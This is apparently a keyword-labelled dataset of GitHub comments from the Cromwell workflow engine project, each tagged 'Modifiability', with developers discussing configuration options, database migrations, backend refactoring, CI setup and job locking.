Modifiability,> I noticed we don't get test details in CircleCI. We might be able to if we configure `store_test_results` with `centaur/target/test-reports`: https://circleci.com/docs/2.0/configuration-reference/#store_test_results. I think we also don't have this for Travis. This would be nice to have as a separate ticket.; https://broadworkbench.atlassian.net/browse/BT-138,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295:77,config,configure,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6187#issuecomment-777938295,2,['config'],"['configuration-reference', 'configure']"
Modifiability,"> I'm not a big fan of copy/pasting the entire backend - not least because now all edit history in git from the original files is lost.; > ; > Is it possible to bring in alpha vs beta as a config option to the backend and just switch which API gets called at the relevant points in the code?; > ; > eg; > ; > ```; > backends {; > PAPIv2alpha {; > class="".../papiv2backend""; > config {; > api_version: ""alpha""; > }; > }; > PAPIv2alpha {; > class="".../papiv2backend""; > config {; > api_version: ""beta""; > }; > }; > }; > ```; > ; > Alternatively, could the `class="".../papiv2beta""` backend just be a really thin extension of the existing papiv2alpha backend, which just overrides the api which gets called during submission and status polling?. I'm not a fan of copy-pasting the whole backend too, but in my opinion, in this particular case it's well justified:; 1. In future (I hope sooner than later) when we'll decide to remove v2aplha1, it'll be as easy as deleting a whole single package.; 2. It's less error-prone - we don't modify v2alpha1 implementation at all.; 3. Between the v2alpha1 and v2beta Google made changes not only in the URL and operation id format, but also in the data model (the most significant ones in `Event` and `Action` classes), so I'm afraid that thin extension would end up not so thin.; 4. Also, I don't think git history will be lost. I think git will consider that as files being renamed. At least this is what I'm seeing on `git log --follow -- /Users/gsterin/projects/cromwell/supportedBackends/google/pipelines/v2beta/src/main/scala/cromwell/backend/google/pipelines/v2beta/LifeSciencesFactory.scala`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-580366936:189,config,config,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-580366936,3,['config'],['config']
Modifiability,"> I'm starting to wonder if it would be easier for me to just write out every CREATE statement to generate the current tables. I'd prefer to use liquibase syntax as much as possible, versus [custom crafted SQL](https://www.liquibase.org/documentation/changes/sql.html). > do you have a preference for 1) trying to make the current migrations work for Postgres too (without breaking the MD5s), or 2) make all existing migrations non-Postgres and add a single comprehensive Postgres-specific migration?. Of the two, I think it would be fantastic if we could do ""1)"". Minimum requirements are that existing MySQL users can startup cromwell w/o a liquibase error. Ultimately, if you can get updated changelogs that actually don't cause collisions with existing MD5s for those populated databases that's one avenue that might work. If not, and ""2)"" is uglier but doesn't break things for MySQL, then so be it. Side note: I suspect the existing Java/Scala changelogs can be a no-op / skip, assuming that anyone using Postgres will not need to migrate data for those specific changes. I believe we skipped those Java/Scala migrations for the in-memory HSQLDB instances. Also, you didn't ask, but in my dream world Cromwell would have changelogs that:; - Use liquibase syntax vs. sql as much as possible; - Work for a new database; - Work for all old/populated databases; - Work for HSQLDB + MySQL + PostgreSQL + MariaDB; - Can be updated to add other databases if/when our [Slick](http://slick.lightbend.com/doc/3.2.3/supported-databases.html) calls work or cromwell switches to another SQL adapter. To get to that last point I've wondered how one would best handle the liquibase MD5 issue in the future, either suppressing the warnings and / or resetting the MD5s as needed. **TL;DR Try 1), but as long as populated MySQL databases still startup with cromwell you're good!**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-475371156:1584,adapt,adapter,1584,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-475371156,1,['adapt'],['adapter']
Modifiability,"> I'm wondering - what would be the return code for the second worker that cannot create the lock? What in the above says ""Try to make the lock, if it doesn't work, come back and try again (and do this until the container is available.). This is the default behaviour of `flock`, I believe. My flock man page says: ""By default, if the lock cannot be immediately acquired, flock waits until the lock is available."". > Overall I think this is a really important thing to think about - aside from cluster resources, if you are pulling an image from a remote registry, that might have negative consequences for the registry. My understanding of Singularity was that the actual *pulling* would be cached using the Singularity cache, and only the *building* would be duplicated. Is this not right? In any case, this will avoid smashing the Singularity cache at least. > I also wouldn't be sparse with the variables, for some future user coming to read this, I would use --exclusive instead of -x and then --unlock instead of -u so it's explicitly clear. Agreed! I'll edit the OP.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509639973:899,variab,variables,899,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509639973,1,['variab'],['variables']
Modifiability,"> Is this because Pipelines API version 1 does not support buckets with requester pays? If so, why cannot Cromwell just say so?. Granted it's not in the error message itself, but the [page I linked](https://cromwell.readthedocs.io/en/stable/filesystems/GoogleCloudStorage/#requester-pays) states. > Pipelines API version 1 does not support buckets with requester pays, so while Cromwell itself might be able to access bucket with RP, jobs running on Pipelines API V1 with file inputs and / or outputs will not work. Pipelines API v1 is deprecated by Google and documentation for it is not maintained; new projects should always use v2. ---. As for the `gcloud` issue I've never done this particular operation personally, but I suspect you may have luck looking at the GCP docs or Stack Overflow. You could opt for [Terra](https://app.terra.bio/) which is basically a fully managed version of Cromwell (it configures Cromwell and all of this project stuff for you). Hope this helps.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665264424:905,config,configures,905,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665264424,1,['config'],['configures']
Modifiability,"> It might be nice to doublecheck in the `newFileSystem` where the `put` happens instead of this one caller since that would make all code paths threadsafe, but I'm not sure if that would introduce any other issues. I agree. But the reason I didn't do this is that `newFileSystem` method has another logic for the case when filesystem with such key already exists - it throws exception instead of just returning the existing filesystem. And this is a contract stated in the core `FileSystemProvider` abstract class.; But I think I can do some refactoring to overcome this problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5328#issuecomment-566167823:543,refactor,refactoring,543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5328#issuecomment-566167823,1,['refactor'],['refactoring']
Modifiability,"> Just curious, was the possibility of checking regionality within the Cromwell server rather than on the VM considered? This might not work in all cases if the target zones for the VM is broad, but in community Terra the default list of `zones` are all within one region. It's an interesting idea. Cromwell can act as the user's pet service account, so it would be able to check bucket locations with the same permissions as the solution here, running on the VM. It's true that the default list of zones on Terra is all in one region, but users can set their own zones, and this PR is partly intended to help catch when people have WDLs/inputs that set the zones list to all of the US zones (for example). This PR is intended to be a failsafe that generalizes (as it happens at the time everything is knowable). This PR is also intended to be a stopgap until there can be a more sophisticated on-submission or pre-submission check. With regards to the list of zones, Cromwell submits this to the PAPI and any of these can be chosen. It would be an interesting idea to try to narrow the user's submitted list and pick the ""best"" zone(s) based on the input locations. That would be a nice additional enhancement in the future.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6332#issuecomment-859740349:1199,enhance,enhancement,1199,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6332#issuecomment-859740349,1,['enhance'],['enhancement']
Modifiability,"> Likely we would want to add a general variable to plug in any user specific arguments (e.g., custom binds) and singularity arguments? (e.g., debug?) I don't know if this is ""how it's supposed to look"". The easiest way to verify a run is to use one (or more) of the [standard test cases](https://github.com/broadinstitute/cromwell/tree/develop/centaur/src/main/resources/standardTestCases). For example you can try to run . ```; java \; -Dconfig.file=my.conf \; -jar cromwell-34.jar \; run centaur/src/main/resources/standardTestCases/hello/hello.wdl \; -i centaur/src/main/resources/standardTestCases/hello/hello.inputs; ```. The accompanying `.test` file lists the CI expectations of the workflow run, ex: `centaur/src/main/resources/standardTestCases/hello.test`. > the stderr files are totally empty, and then the one stdout (without extension) shows those two mapping files … Let me know if this looks correct? What you are looking for? Completely off base?. Based on the WDL you linked to, this output looks like what was expected :+1:. > Also - any reason to have all capitals vs. lowercase for the backend examples? (e.g. SLURM vs slurm). no reasoN. ---. On a related note I personally would love to see cromwell+singularity running under our CI, so that we could all a) point others at the working example and b) be sure the examples continue to work in the future. Most Broadies I know are even greener on Singularity than CircleCI, but I would be keen to learn sometime. Google turned up your earlier work on installing (parts-of?) [Singularity on a Travis VM](https://github.com/singularityhub/singularity-ci). That combined with these commented out configs could be a fantastic starting point to getting singularity+cromwell regularly tested together. For a similar example, with cromwell+TES, here is where that CI script installs and runs `funnel`:. https://github.com/broadinstitute/cromwell/blob/9f33e2a867fe20924e4f24e0cba8774f7d6d3132/src/ci/bin/testCentaurTes.sh#L14-L36. A simila",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519:40,variab,variable,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-416313519,1,['variab'],['variable']
Modifiability,"> Lot's of good stuff here on first glance. I'll dive deeper over the weekend. ok!. > For better or worse, depending on pricing, support, reliability, etc. etc. etc. we like to move around our CI. I personally also like being able to test scripts on my laptop as much as possible. Yes we definitely can! See my comment above - it just is above moving the little snippet where the test actually happens from a command block to running a script from that same command block. > To that end, I'm trying to advocate for bash scripts that are then invoked from whatever CI we choose. +1!. > I haven't RTFM'ed enough of this PR nor CircleCI's manual yet to fully grasp what specific Circle features are being used here. Could a lot of the logic be separated from the .circleci/config.yml into a script, or multiple scripts if necessary?. I think the part we would want to take out are the testing commands, just executed via some primary file (that calls the individual ones, and which could be run on a host). > On a related note, based on your expertise I may want to pick your brain to go over our existing CI scripts too as we move to Circle, or perhaps something even shinier newer. Sure! I'm always around :). > Re your build failing: it wasn't anything in your PR. Based on the logs there was a weird connection issue between Travis and Github returning HTTP 5xx errors during the tests. Yeah, I've unfortunately been there :P Good luck this weekend!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-414000388:770,config,config,770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4015#issuecomment-414000388,1,['config'],['config']
Modifiability,"> May I get a review on the design, but not the scala?. Wow thanks for adding this. This is exactly what we need on our cluster. Sometimes the scheduler aggressively kills jobs based on VMEM (instead of actual mem). So retrying with upping the memory requirements is a nice way to circumvent this annoying issue. (Instead of using insane memory requirements to make sure it passes in 99% of the cases). As for the design. I would add; 1. A number of attempts configurable parameter in the config. A sane default would be 1. Meaning that this feature will not be used by default, for reasons elaborated on later.; 2. A factor with which the memory is increased on each attempt. So if the factor is 1.5 > Attempt 1 will be 1.5^0 = 1 times the memory, Attempt 2 1.5^1 = 1.5, Attempt 3 = 1.5^2 = 2.25. A sane default here would be 2 I guess. As for @cjllanwarne's concerns:. > The spec defines a maximum memory value, above which Cromwell will never go; ; I think the spec just states the value that should be given to whatever backend. But semantics aside, I guess that means the same as saying it is the maximum. > Cromwell will be able to run WDLs which will not run anywhere else... and thus we would have to be very strict in policing our ""best practices"" WDL to makes sure it can be run on other engines. This is a very good reason to not enable this feature by default. But since there are very good reasons for having this feature, having it as a configurable option will be very very nice. Let the user decide how they want to treat their memory requirements. That is the most user-friendly way to do. This is why I think a sane default for the number of attempts should be 1 (i.e. no retries).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5017#issuecomment-499374511:459,config,configurable,459,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5017#issuecomment-499374511,3,['config'],"['config', 'configurable']"
Modifiability,"> Our bioinformatics team have been reporting a single retry after preemptible attempts have been exhausted. To clarify, is Cromwell retrying preemptibles the specified number of times and then running one more time on non-preemptible?. As of today that is the [expected behavior](https://cromwell.readthedocs.io/en/stable/RuntimeAttributes/#preemptible) because it is assumed that a user isn't going to completely give up on their analysis just because it got interrupted repeatedly:. > Take an Int as a value that indicates the maximum number of times Cromwell should request a preemptible machine for this task before defaulting back to a non-preemptible one. A change to categorically disable this behavior would break existing users and can't merge, but what might work is a boolean runtime attribute that skips the regular VM. That said, the team must think carefully about increasing the configuration surface area of the product and I can't promise that such a PR would be accepted.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030119179:895,config,configuration,895,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6666#issuecomment-1030119179,1,['config'],['configuration']
Modifiability,"> Should we include a backwards compatibility adapter so that existing configuration still work? It would be sad if someone upgraded Cromwell without reading the release noted and suddenly they have no (recognized) backends configured. I'm not sure about that, since with `v2beta` there was introduced an additional mandatory parameter: `location` (currently supported `us-central1` and `europe-west2`). If we decide to coerce configured v2alpha1 actor factory to v2beta, then we'll also have choose some default value for `location`, which I'd be cautious to do due to possible issues (e.g., someone runs Cromwell in Europe and doesn't want their data to leave Europe)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-579385715:46,adapt,adapter,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-579385715,4,"['adapt', 'config']","['adapter', 'configuration', 'configured']"
Modifiability,"> Since this is a big change to the way we start jobs, I'm wondering if we want to include an ""off switch"" in the initial release. If we discovered a problem with this behavior and want to quickly revert to the old behavior, can we do that by setting the config to a 0 minute threshold? Should we build in an enabled flag for this behavior in config?. @jgainerdewar yes I had thought about that and setting the config to 0 should work. But I like your suggestion about having an actual config value like `enabled` instead which should make it more clear. Use the `enabled` flag would also be better so that if it is set to false the `JobTokenDsispenserActor` won't ask `GroupMetricsActor` about exhausted groups at all.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204:255,config,config,255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7520#issuecomment-2332183204,4,['config'],['config']
Modifiability,"> TOL: To me this feels like it’d be way neater if the EGIN had a field or def called inputFileName nameInInputSet, to encapsulate all this into the egin itself rather than having to add it later externally?. Good point, I was just reticent to the idea of jamming yet another attribute injected by the language that will only ever be used once during the lifetime of the workflow but I agree it's still neater. > FWIW in my ideal world we’d have pluggable languages which should only need to define one function like “readWorkflowIntoWom(content: String, l: Set[ImportResolver]): WomExecutable” and everything else would be included/encapsulated in that result. Yes but there would be some non-DRYness by having each language implement entirely how they ingest inputs (most of the logic is the same), plus having it in WOM guarantees that all EGIN are handled the same way w.r.t coercion, validation etc.. It could use some refactoring though I agree",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349344402:924,refactor,refactoring,924,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2988#issuecomment-349344402,1,['refactor'],['refactoring']
Modifiability,"> The docs are correct, the local docker backend does not recognize CPU and memory attributes, because it's impossible to implement with the Docker Desktop API. And even if it was, it would probably not ship because the local backend is intended as a down-featured sandbox environment. @aednichols Are you talking specifically about macOS? You can limit `cpu` and `memory` by running docker on linux though.; I've gotten `cpu` (cores actually) limit working with the following code in the conf file:; ```; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? docker_user; Int cpu = 1; """""". # Submit string when there is no ""docker"" runtime attribute.; submit = ""/usr/bin/env bash ${script}"". # Submit string when there is a ""docker"" runtime attribute.; submit-docker = """"""; docker run \; --rm -i \; ${""--user "" + docker_user} \; ${""--cpus="" + cpu} \; --entrypoint ${job_shell} \; -v ${cwd}:${docker_cwd} \; ${docker} ${docker_script}; """"""; ```. A task that needs more cpu cores would simply request it with the runtime block:; ```; runtime {; docker: ""...""; cpu: 3; }; ```. I've gotten the idea from @ruchim post. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1303286500:265,sandbox,sandbox,265,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1303286500,1,['sandbox'],['sandbox']
Modifiability,"> The messages are logging the size of the list being (re-)added to the BatchRequest, not what's inside the possibly stale ArrayList inside the BatchRequest object. Yeah okay maybe don't mention that then since it will force those future maintainers to imagine what was happening before this variable became a local...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800620139:292,variab,variable,292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6218#issuecomment-800620139,1,['variab'],['variable']
Modifiability,"> There is one I'm having trouble googling a fix for. I can't figure out how to shut off PostgreSQL exceptions printing possibly sensitive row contents via their messages. I wouldn't be surprised if this is baked into the JDBC layer. We could try something like this:; ```; diff --git a/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala b/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala; index 5d28cf1..5b0e227 100644; --- a/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala; +++ b/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala; @@ -11,6 +11,7 @@ import net.ceedubs.ficus.Ficus._; import org.slf4j.LoggerFactory; import slick.basic.DatabaseConfig; import slick.jdbc.{JdbcCapabilities, JdbcProfile, TransactionIsolation}; +import org.postgresql.util.{PSQLException, ServerErrorMessage}. import scala.concurrent.duration._; import scala.concurrent.{Await, ExecutionContext, Future}; @@ -199,6 +200,8 @@ abstract class SlickDatabase(override val originalDatabaseConfig: Config) extend; case _ => /* keep going */; }; throw rollbackException; + case pe: PSQLException =>; + throw new PSQLException(new ServerErrorMessage(s""Oh no, a postgres error occurred! ${pe.getMessage}"")); }; }(actionExecutionContext); }; ```; only with some on-the-fly modification of the error message instead of my dummy string. This compiles for me, but I'm not sure how to test it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-504487606:1061,Config,Config,1061,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-504487606,2,"['Config', 'extend']","['Config', 'extend']"
Modifiability,"> There's quite a bit of debate internally about this PR. Some team members remain deeply uncomfortable with how locking is handled, but it would take us a lot of time to research and recommend a better solution. If I may reiterate: by default this does not break anything for anyone. The locking only happens when `cached-copy` is set in the config consciously by the user. I maintain [my own patched jar for cromwell](https://github.com/rhpvorderman/cromwell/releases/tag/41-LUMC-patches), because this is taking very long already. We are running this in production and not experiencing problems. (There are only problems when the maximum number of hardlinks is reached, then cromwell defaults to copying again. It does not break anything, but it will use a lot of space on the filesystem and it will slowdown pipeline runs. I am working on a fix for that as well.)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-504046142:343,config,config,343,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-504046142,1,['config'],['config']
Modifiability,"> This is a big improvement, but I think we can go even farther in collapsing these two concepts. I believe that all of the comments here should be addressed in my most recent refactor which groups `continueOnReturnCode` and `returnCodes` together as much as I think they can be, let me know if there's any better way that I can refactor or improve the PR!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7389#issuecomment-2027702391:176,refactor,refactor,176,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7389#issuecomment-2027702391,2,['refactor'],['refactor']
Modifiability,"> This is a common configuration that prohibits docker. ""Local"" and SGE/HPC are two separate issues. SGE (and all HPC) backends can already run without docker. When setting up the backend, just don't add a `submit-docker` config variable nor a `docker` runtime attribute to the backend's configuration. Docs for new local/HPC backends are documented under the title ""[SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/)"". Separately, there is the issue that cromwell is pre-loaded with a default ""Local"" backend. This ""Local"" backend [is docker enabled](https://github.com/broadinstitute/cromwell/blob/a3c5e055a5a4c6793a526689d38577c2f122bc95/core/src/main/resources/reference_local_provider_config.inc.conf#L9-L34). The simplest workaround today is to create another backend ""Local-NoDocker"" or similar. Or if one wants to just change the existing ""Local"" backend they can use a config like:. ```hocon; include required(classpath(""application"")); backend.providers.Local.config.runtime-attributes=""""; backend.providers.Local.config.submit-docker=null; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-423240258:19,config,configuration,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-423240258,7,"['config', 'variab']","['config', 'configuration', 'variable']"
Modifiability,"> What's weird is that long_cmd fails consistently for me. Are you using the CI config files, or your own config file? `long_cmd` generates an _extremely_ long command line that approximates one of the longer gatk best practice commands. However the test line is so long that an [optional abbreviation](https://github.com/broadinstitute/cromwell/blob/develop/src/ci/resources/build_application.inc.conf#L23) setting was added and enabled-in-CI so that the test could run. With [a bit of setup](https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472915580) one can run `src/ci/bin/testCentaurAws.sh` and it will attempt to use the CI configs locally.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4747#issuecomment-473123093:80,config,config,80,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4747#issuecomment-473123093,3,['config'],"['config', 'configs']"
Modifiability,"> it is trying to resubmit jobs to the local engine. Do you mean jobs that were running when you stopped Cromwell were ""restarted"" on the local backend ?; Or new downstream jobs for the same workflow were then submitted to the local backend ?; Or both ?. I imagine you did not change your configuration in between the stop/start ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4215#issuecomment-444536539:289,config,configuration,289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4215#issuecomment-444536539,1,['config'],['configuration']
Modifiability,"> the tutorial, right in the section describing the configuration file for PAPIv1, neither states this simple fact about Requester Pays not working with PAPIv1. We should probably remove the PAPIv1 tutorial entirely, it has carried the deprecation warning for over a year now. It lives [here](https://github.com/broadinstitute/cromwell/blob/develop/docs/tutorials/PipelinesApi101.md) and we will gladly merge improvement PRs. > My best guess is that, albeit extremely counter-intuitive, I have access to this bucket with my personal account but I do not have access to this bucket with my service account. Oh my, this is so complicated ... That does seem like a probable explanation, though I don't know the particulars of how you set up your SA. Cloud architecture is a large beast and Cromwell targets a very specific cross section of it (running workflows). A particular account having access to input data would need to be configured as a prerequisite. Since I see you are at Broad, perhaps BITS can help with it. > `storage.objects.list` issue. I recommend trying to recreate the scenario locally with `gsutil cp` and the desired service account & file. Your turnaround time will be much faster than running the workflow. It is certainly possible that Cromwell has a bug that causes GCS to incorrectly deny access, but we generally would like to see the same file/account combination working correctly outside of Cromwell before we will accept it as a bug report.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665310550:52,config,configuration,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665310550,2,['config'],"['configuration', 'configured']"
Modifiability,">I assume that we're using the service registry + a whole new actor with the expectation that eventually we'll be calling some external service?. @aednichols that is correct. Once ECM supports returning Github tokens, this will be updated to actually call the new ECM endpoint instead of getting access token from the config.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7365#issuecomment-1955000123:318,config,config,318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7365#issuecomment-1955000123,1,['config'],['config']
Modifiability,">It'd be a shame for this PR if Google expected that people might want to lower this value, but didn't want anyone to raise it. Google confirmed to me that yes, it can be raised, up to 30 days – that might be a useful thing to note in a config comment. See https://broadworkbench.atlassian.net/browse/BA-6015",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5273#issuecomment-555176373:237,config,config,237,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5273#issuecomment-555176373,1,['config'],['config']
Modifiability,"@ALTree if you're referring specifically to PBS, that can now be supported with a little kludging purely through configuration. The only feature of PBS cluster that needs special treatment is the handling of stderr and stdout, which by default on PBS are copied to the execution directory only _after_ the job completes. [The config file in this gist](https://gist.github.com/delocalizer/fa29139675fb4118e908a4c80249dffb) works for me. Note that it requires that PBS_JOBDIR (the user's home directory by default, but can be a custom value) is shared across compute nodes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1106#issuecomment-254165500:113,config,configuration,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1106#issuecomment-254165500,2,['config'],"['config', 'configuration']"
Modifiability,@AlesMaver Can you share your whole config file?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764906695:36,config,config,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6094#issuecomment-764906695,1,['config'],['config']
Modifiability,"@EvanTheB I think I can answer that for you... much like `check-alive`, the `run-in-background` config point is only relevant for aborts and restarts; cromwell identifies what it needs to kill or restart based on the PID instead of the scheduler job id. The only way that cromwell knows whether a job is done or not is by checking for the existence of the `rc` file.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380681715:96,config,config,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-380681715,1,['config'],['config']
Modifiability,@EvanTheB We use SGE. The problem is our configuration. SGE checks on VMEM instead of actual memory used. This means that a lot of java tools will exceed the memory limits and be killed by the scheduler. In that case there is no RC file. That is why qstat -j should be checked as well. > The problem with just increasing this value is that it also slows checking for the rc file. Maybe we can do this in a more elegant way. I will have a look at your script and also at the cromwell code. It should be trivial to decouple the RC file checking from the check-alive checking. Maybe my colleague @DavyCats has some suggestions as well? Also I know that @cpavanrun uses a similar backend and makes use of this feature. Maybe he also has some suggestions.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4905#issuecomment-488991546:41,config,configuration,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4905#issuecomment-488991546,1,['config'],['configuration']
Modifiability,"@EvanTheB Yeah, `File` in WDL is **not** supposed to reference a directory (as you noted in your followup, that's a whole separate topic). It manages to work-ish by happenstance on shared filesystem backends, as you discovered - we came across that a little while back. . I'd call it one of those things where if it Works For You then knock yourself out but keep in mind that it's not supported behavior and if your WDL relies on it they'll not be portable in cloud environments.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3785#issuecomment-402780568:448,portab,portable,448,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3785#issuecomment-402780568,1,['portab'],['portable']
Modifiability,"@EvanTheB `reference.conf` is the configuration file used by Cromwell.; > Also is there any way to actually enumerate all the available settings?. I am not sure how we can do that. But you are right, it might be a lot of effort to restructure/modify those files to be able to enumerate it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4776#issuecomment-478589687:34,config,configuration,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4776#issuecomment-478589687,1,['config'],['configuration']
Modifiability,"@Horneth . > Is there an equivalent for JES runtime attributes validation that could need an update as well ?. Not that I can think of. JES's runtime attributes are [hardcoded](https://github.com/broadinstitute/cromwell/blob/23/supportedBackends/jes/src/main/scala/cromwell/backend/impl/jes/JesRuntimeAttributes.scala#L19-L28) into the scala code. Meanwhile, these are the declarations of runtime attributes for the Config based backend. Via the config, one can specify the list of valid runtime attributes for _your_ backend, PBS, LSF, SGE, etc. See #1737 for an example of where this was broken.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1738#issuecomment-264924049:416,Config,Config,416,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1738#issuecomment-264924049,2,"['Config', 'config']","['Config', 'config']"
Modifiability,"@Horneth @cjllanwarne sure we can make the choice of auths explicit in `genomics` and `filesystems`. I did want to keep it clear in the config which auth was for Cromwell and which was for the user so we didn't make it impossible to implement call log copying in FireCloud (in case someday we want to use that feature there). How about something like the following for FireCloud:. ``` hocon. // Same as the preceding FireCloud sample conf; google {; application-name = ""cromwell"". // There may be instances like the final call that copies call logs which will need to be able to generate both; // Cromwell and user authentication, so making these explicit.; cromwellAuthentication {; scheme = ""application_default""; }. // Used for engine functions involving the filesystem.; userAuthentication {; scheme = ""refresh""; client-id = ""secret_id""; client-secret = ""secret_secret""; }; }. // genomics with explicitly selected conf; genomics {; ...; auth = ""cromwell""; ...; }. ...; filesystems = [; // gcs filesystem with explicitly selected conf; gcs {; auth = ""user""; }; ]; ... ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203469472:136,config,config,136,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/627#issuecomment-203469472,1,['config'],['config']
